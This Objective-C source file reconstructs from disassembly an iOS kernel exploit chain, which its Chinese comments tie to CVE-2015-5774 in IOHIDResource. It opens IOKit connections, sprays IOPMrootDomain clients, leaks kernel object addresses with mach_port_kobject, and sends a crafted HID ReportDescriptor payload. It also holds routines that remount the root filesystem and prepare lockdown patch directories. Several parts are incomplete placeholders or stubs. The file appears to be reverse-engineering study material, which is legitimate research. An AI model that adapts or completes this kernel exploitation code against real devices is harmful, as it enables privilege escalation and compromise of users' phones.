//
//  main.m
//  taij_
//
//  Created by huke on 8/9/15.
//  Copyright (c) 2015 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>
#include <CoreFoundation/CoreFoundation.h>
#include <sys/stat.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mount.h>
#include <sys/param.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/mach_host.h>
#include <IOKit/IOKitLib.h>
#include <IOKit/IODataQueueClient.h>

int sub_10bcc(int arg1,int arg2);//主要攻击函数
int sub_ba2c(int arg1,int arg2,int arg3);//CVE-2015-5774的利用.arg1是IOHIDResource的connect.这个函数的调用甚至在输出s %d和alloc和%p%p%p%p之前
int sub_1288c();//host_zone_info
mach_vm_address_t sub_1312c();

int sub_c4d4(void);
int sub_c528();
int sub_b948(char *arg);
int sub_bbe4(int arg1,int arg2,int arg3);

int sub_ba1c(void);

//字符串
char* sub_11704(void); //这里对sub_11704的调用省略了.直接写了字符串内容
char* sub_11714(void);
char* sub_11754(void);
char* sub_11724(void);
char* sub_11744(void);

void sub_11094(void *arg); //这是返回一长串16进制数.是每次都不变的.用来对IOHIDResource进行IOConnectCall时的inputStruct
int sub_11b18(int arg0, int arg1, int arg2, int arg3, int arg4, int arg5, int arg6);//CVE-2015-5774,调用IOHIDLibUserClient::_updateElementValues方法.
int sub_bbe4(int arg1,int arg2,int arg3);

int sub_b948(char* arg1);

int main (int argc, const char * argv[])
{
    
    
    //这里用task_for_pid判断,如果不行意味着内核没打补丁,就会执行sub_10bcc
    sub_10bcc(0x001acd78,0x0);
    return 0;
}

//主要的函数
int sub_10bcc(int arg1,int arg2){
    //sub_10bec获取内核地址...具体自己分析
    void *arg_1A0 = malloc(0x1000);
    memset(arg1,0x0,0xd8);
    memset(arg_1A0,0x0,0x1000);
    //memset初始化许多堆.....省略
    //这里有个判断.但是正常会执行下面的代码
    sub_ba2c(sub_ba1c(),nil,nil);//这里的arg2,arg3是常量,不变的.所以我去掉了.值直接在sub_ba2c里获取.
    mach_vm_address_t atAddress = 0;
    mach_vm_size_t ofSize = 0;
    IOConnectMapMemory(<#io_connect_t connect#>,0,mach_task_self(),&atAddress,&ofSize,kIOMapAnywhere);
    //IOConnectMapMemory的connect为IOHIDResource
    time_t t = time(0x0);
    srand((unsigned int)t);
    kern_return_t ret;
    CFDictionaryRef match;
    io_service_t service;
    io_connect_t connect;
    io_connect_t connect_arg_B4;
    int i;
    match = IOServiceMatching("IOPMrootDomain");
    if(match!=0){
        service = IOServiceGetMatchingService(kIOMasterPortDefault,match);
        if(service!=0){
            sub_1288c();
            mach_zone_force_gc(mach_host_self());
            //mach_zone_force_gc mac的sdk里存在,ios的没有.解决办法是使用mac的sdk中的mach_host头文件
            sub_1288c();
        }
        ret = IOServiceOpen(service,mach_task_self(),0,&connect_arg_B4);
        if(ret!=KERN_SUCCESS){
            printf("IOServiceOpen(service,mach_task_self(),0,&connect_arg_B4); ERROR\n");
            //ERROR
        }
        NSMutableArray *connectArray = [[NSMutableArray alloc]init];
        for(i=0;i<0x440;i=i+0x1){
            ret = IOServiceOpen(service,mach_task_self(),0,&connect);
            [connectArray addObject:[NSNumber numberWithUnsignedInt:connect]];
        }
        for(i=0x10f0;i!=0xf0;i=i-0x10){
            /*00011eee         add.w      lr, sp, #0x1c
             00011ef2         add.w      r2, lr, #0x4980
             00011ef6         add        r2, r1
             00011ef8         subs       r1, #0x10
             00011efa         vld1.32    {d16, d17}, [r2]
             00011efe         cmp        r1, #0xf0
             00011f00         vrev64.32  q8, q8
             00011f04         vext.64    q8, q8, q8, #0x1
             00011f08         vst1.32    {d16, d17}, [r0]
             00011f0c         add.w      r0, r0, #0x10
             00011f10         bne        0x11eee*/
            //循环结束后r1为0xf0,r2为0x0020913c,这是一次测试中的结果,用于参考.
        }
        IOObjectRelease(service);
        printf("\\n");
        natural_t obj_type = 0x1d;//这个值实际没有关系.就算是通过函数返回的值也用不到
        mach_vm_address_t obj_addr_s;
        ret = mach_port_kobject(mach_task_self(),connectArray[0],&obj_type,&obj_addr_s);
        mach_vm_address_t obj_addr;//虽然有值但mach_port_kobject函数和obj_addr传入的值没关系.
        mach_port_name_t name = connectArray[[connectArray count]];//就是循环使用上面IOServiceOpen得到的connect
        
        NSMutableArray *obj_addrArray = [[NSMutableArray alloc]init];
        
        if(ret==KERN_SUCCESS&&obj_addr_s<0x1000){//&& (*(&arg_50 + 0x150) < 0x1000)
            int r4=0x4;//r4这个变量在汇编中是给数组寻址的
            i=0;//i是我加的,实际的功能就是下面的代码
            do{
                i=i+1;
                mach_port_kobject(mach_task_self(),name,&obj_type,&obj_addr);
                name = connectArray[[connectArray count]-i]; //汇编中为倒着寻址
                obj_addr = obj_addr - sub_1312c();
                [obj_addrArray addObject:[NSNumber numberWithUnsignedLongLong:obj_addr]];
                if(r4==0x1000)
                    break;
                r4=r4+0x4;
                //name变量每次都会改变,obj_addr每次会减去sub_1312c返回的数字(是固定的值).但是不知道obj_addr开始的值如何得到.
            }while(1);
            //在实际汇编代码中,在循环之前,就把字符串"%p %p %p %p"的地址给某个寄存器了.
            //r1 = 0x1
            //r4 = 0xfffff004; //0xFFC
            //r5 = 0x0013b840 //前面那个mach_port_kobject循环最后储存obj_addr数据的Array的开头.
            //A = *(r5 + r4 + 0x1000) //就是0x0013b840 - 0xFFC + 0x1000 结果等于0x0013b844 就是Array第二个对象.
            //B = *(r5 + r4 + 0xFFC) //就是0x0013b840 - 0xFFC + 0xFFC 结果是0x0013b840 就是Array第一个对象
            //然后if(( B - A ) == 0x80)
            /*{ r1 = r1 + 0x1
             }
             else{
             NSLog(@"s %d",r1);
             r1=0x1;
             }
             所以,如果第二个对象比第一个对象大0x80.就会输出s 2 .否则就是输出s 1
             实际意义还是得通过lldb分析后面的行为
             */
            int connectArrayCountNumber = 0x1;
            for(i=1;i<[obj_addrArray count];i++){
                mach_vm_address_t first_obj = [obj_addrArray[i-1] unsignedLongLongValue];
                mach_vm_address_t second_obj = [obj_addrArray[i] unsignedLongLongValue];
                if((second_obj-first_obj)==0x80){
                    connectArrayCountNumber = connectArrayCountNumber + 0x1;
                }
                else{
                    NSLog(@"s %d",connectArrayCountNumber);
                    connectArrayCountNumber = 0x1;
                }
            }
            NSLog(@"alloc %d",connectArrayCountNumber);
            
            for(i=0;i<[obj_addrArray count];i=i+4){
                NSLog(@"%llu %llu %llu %llu",[obj_addrArray[i] unsignedLongLongValue],[obj_addrArray[i+1] unsignedLongLongValue],[obj_addrArray[i+2] unsignedLongLongValue],[obj_addrArray[i+3] unsignedLongLongValue]);
                //在汇编中这里NSLog的第一个参数是%p %p %p %p.我改了下.效果应该是一样的.
            }
            rand();
        }else{
            //ERROR
        }
        ...//sub_11b18
        
    }
}

int sub_1288c(){
    //host_zone_info(mach_host_self(),<#zone_name_array_t *names#>, <#mach_msg_type_number_t *namesCnt#>, <#zone_info_array_t *info#>, <#mach_msg_type_number_t *infoCnt#>);
    //用来估计内存堆分配情况的函数
}

mach_vm_address_t sub_1312c(){
    kern_return_t ret;
    io_master_t io_master;
    natural_t obj_type;
    mach_vm_address_t obj_addr;
    ret = host_get_io_master(mach_host_self(),&io_master);
    //io_master=0x00000e0b
    mach_port_kobject(mach_task_self(),io_master,&obj_type,&obj_addr);
    //subs r0,#0x1
    return obj_addr;
}

int sub_c4d4(){
    char *data = strdup("/dev/disk0s1s1");
    int ret = mount("hfs","/",MNT_UPDATE,data);
    return ret;
}

int sub_c528(){
    char *lockdown_file;
    void *lockdown_000 = malloc(0x80);
    memset(lockdown_000,0x30,0x80);
    mkdir("/DeveloperPatch",0x1ed);
    mkdir("/var/run",0x1ed);
    mkdir("/var/run/lockdown_patch",0x1ed);
    sprintf(lockdown_file,"/var/run/lockdown_patch/%s",lockdown_000);
    mkdir(lockdown_file,0x1ed);
    sprintf(lockdown_file,"/var/run/lockdown_patch/%s/%s",lockdown_000,lockdown_000);
    mkdir(lockdown_file,0x1ed);
    sprintf(lockdown_file,"/var/run/lockdown_patch/%s/%s/lockdown_patch.dmg",lockdown_000,lockdown_000);
    if(sub_b948("IOHDIXController")==0){
        //__stack_chk_guard
        printf("sub_b948 error\n");
        exit(1);
    }
    else{
        // CFDictionaryCreateMutable(kCFAllocatorDefault,0, <#const CFDictionaryKeyCallBacks *keyCallBacks#>, <#const CFDictionaryValueCallBacks *valueCallBacks#>)
    }
}

int sub_b948(char *arg){
    int ret;
    io_service_t service;
    io_connect_t connect;
    CFMutableDictionaryRef dic = IOServiceMatching(arg);
    if(dic!=0){
        service = IOServiceGetMatchingService(kIOMasterPortDefault,dic);
        if(service!=0){
            IOServiceOpen(service,mach_task_self(),0,&connect);
            IOObjectRelease(service);
            ret = connect;
        }
        else{
            ret = 0;
        }
    }
    return ret;
}


int sub_ba2c(int arg1,int arg2,int arg3){
    //arg2是数据.arg3是size.因为是常量.所以就修改了下.
    natural_t obj_typ;
    mach_vm_address_t obj_add;
    if(mach_port_kobject(mach_task_self(),arg1,&obj_typ,&obj_add)==KERN_SUCCESS){
        
        kern_return_t ret;
        CFMutableDictionaryRef dic = CFDictionaryCreateMutable(kCFAllocatorDefault,0x0, &kCFTypeDictionaryKeyCallBacks,&kCFTypeDictionaryValueCallBacks);
        void *byte = malloc(160);
        sub_11094(byte); //这里本来来自arg2的.因为是常量.修改了意思一样的
        CFDataRef data = CFDataCreate(kCFAllocatorDefault,byte,160);
        CFStringRef str = CFSTR("ReportDescriptor"); //调用sub_11754
        CFDictionarySetValue(dic,str,data);
        CFDataRef list_data = CFPropertyListCreateData(kCFAllocatorDefault,dic,0x64,0x0,NULL);
        UInt8 bytePtr = CFDataGetBytePtr(list_data);
        CFIndex len = CFDataGetLength(list_data);
        void *buf = malloc(0x400);
        memset(buf,0x0,0x400);
        memcpy(buf,bytePtr,len);
        CFDataGetLength(list_data);
        uint64_t input;
        ret = IOConnectCallMethod(arg1,0,&input,1,buf,0x1cb,NULL,NULL,NULL,NULL);
        if(ret!=KERN_SUCCESS){
            CFDataGetLength(list_data);
            ret = IOConnectCallMethod(arg1,0,&input,0,buf,0x1cb,NULL,NULL,NULL,NULL);
            if(ret==KERN_SUCCESS){
                usleep(0x4e20);
                io_service_t service;
                io_iterator_t ite;
                if(IOConnectGetService(arg1,&service)!=KERN_SUCCESS){
                    //r4=0
                }
                else{
                    if(IORegistryEntryCreateIterator(service,kIOServicePlane,0x0,&ite)==KERN_SUCCESS){
                        //r4 = sub_bbe4(ite,obj_add, <#int arg3#>) //arg3是一个空的堆
                    }
                }
                
            }
        }else{
            //如果第一个IOConnectCallMethod没有通过.
            usleep(0x4e20);
            io_service_t service;
            io_iterator_t ite;
            if(IOConnectGetService(arg1,&service)!=KERN_SUCCESS){
                //r4=0
            }
            else{
                if(IORegistryEntryCreateIterator(service,kIOServicePlane,0x0,&ite)==KERN_SUCCESS){
                    //r4 = sub_bbe4(ite,obj_add, <#int arg3#>) //arg3是一个空的堆
                }
            }
        }
    }
    //后面一系列的释放操作.最后 r0 = r4 //return r4
}


int sub_ba1c(void){
    return sub_b948(sub_11714()); //IOHIDResource(CVE-2015-5774)
}

char* sub_11754(void){
    return "ReportDescriptor";
}

char* sub_11714(void){
    return "IOHIDResource";
}

char* sub_11704(void){
    return "IOPMrootDomain";
}

char* sub_11724(void){
    return "IOHIDLibUserClient";
}

char* sub_11744(void){
    return "IOUserClientClass";
}

int sub_bbe4(int arg1,int arg2,int arg3){
    io_object_t ser = IOIteratorNext(arg1);
    if(ser!=0){
        CFMutableDictionaryRef properties;
        if(IORegistryEntryCreateCFProperties(ser,&properties,kCFAllocatorDefault,0)==0){
            void *cfs = CFDictionaryGetValue(properties,CFSTR("IOUserClientClass")); //调用IOHIDLibUserClient
            if(cfs!=0){
                if(CFGetTypeID(cfs)==CFStringGetTypeID()&&CFEqual(cfs,CFSTR("IOUserClientClass"))){
                    //IOServiceOpen相应客户端.
                    io_connect_t connect;
                    IOServiceOpen(ser,mach_task_self(),0,&connect);
                }
                
            }
        }
    }
}
//XREF=0x127b0 //静态汇编的地址
int sub_11b18(int arg0, int arg1, int arg2, int arg3, int arg4, int arg5, int arg6){
    //创建线程,线程运行sub_11928
    //IOConnectCallMethod(r0, 0x3.....
    //这个函数就是利用CVE-2015-5774
}

void sub_11094(void *arg) {
    //本来有4个参数.后面三个参数我写在下面.因为是常量,不变的,所以我重写了一样差不多意思的,第一个参数是一个指针.就是修改指针的指向的那块区域.
    //arg1:0xffffffff
    //arg2:0x1 ^ 0xffffffff
    //arg3:0x2 ^ 0xffffffff
    /**(int8_t *)arg0 = 0x7;
     *(arg0 + 0x1) = arg2;
     *(int8_t *)(arg0 + 0x5) = 0x27;
     *(arg0 + 0x6) = arg1;
     *(int8_t *)(arg0 + 0xa) = 0x17;
     *(arg0 + 0xb) = arg1;
     *(int8_t *)(arg0 + 0xf) = 0x47;
     *(arg0 + 0x10) = arg1;
     *(int8_t *)(arg0 + 0x14) = 0x37;
     *(arg0 + 0x15) = arg1;
     *(int8_t *)(arg0 + 0x19) = 0xa7;
     *(arg0 + 0x1a) = 0x0;
     *(int8_t *)(arg0 + 0x1e) = 0xb7;
     *(arg0 + 0x1f) = 0x0;
     *(int8_t *)(arg0 + 0x23) = 0xa3;
     *(arg0 + 0x24) = arg3;
     return 0x28;*/
    
    char byte[] = {0x07,0xfe,0xff,0xff,0xff,0x27,0xff,0xff,0xff,0xff,0x17,0xff,0xff,0xff,0xff,0x47,0xff,0xff,0xff,0xff,0x37,0xff,0xff,0xff,0xff,0xa7,0x00,0x00,0x00,0x00,0xb7,0x00,0x00,0x00,0x00,0xa3,0xfd,0xff,0xff,0xff,0x07,0x00,0x00,0x00,0x00,0x0a,0x00,0x00,0x27,0x00,0x00,0x00,0x00,0x17,0x00,0x00,0x00,0x00,0x47,0x00,0x00,0x00,0x00,0x37,0x00,0x00,0x00,0x00,0x67,0x00,0x00,0x00,0x00,0x57,0x00,0x00,0x00,0x00,0x77,0x08,0x00,0x00,0x00,0x97,0x7f,0x00,0x00,0x00,0x87,0x01,0x00,0x00,0x00,0x93,0x03,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x0a,0x00,0x00,0x27,0x00,0x00,0x00,0x00,0x17,0x00,0x00,0x00,0x00,0x47,0x00,0x00,0x00,0x00,0x37,0x00,0x00,0x00,0x00,0x67,0x00,0x00,0x00,0x00,0x57,0x00,0x00,0x00,0x00,0x77,0x08,0x00,0x00,0x00,0x97,0x7f,0x00,0x00,0x00,0x87,0x02,0x00,0x00,0x00,0x93,0x03,0x00,0x00,0x00,0xc3,0x00,0x00,0x00,0x00};
    memcpy(arg,byte,sizeof(byte));
}
